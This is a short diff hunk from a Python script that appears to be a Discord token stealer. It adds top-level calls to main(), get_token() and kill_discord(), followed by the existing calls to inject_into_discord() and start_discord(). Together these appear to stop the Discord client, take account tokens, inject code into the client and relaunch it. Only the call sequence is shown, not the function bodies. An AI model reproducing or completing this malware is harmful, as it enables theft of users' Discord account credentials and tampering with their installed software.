@@ -790,9 +790,14 @@ def main():
   
 kill_discord()
 
+main()
+
+get_token()
+
+kill_discord()
+
 inject_into_discord()
 
 start_discord()
-
 
 
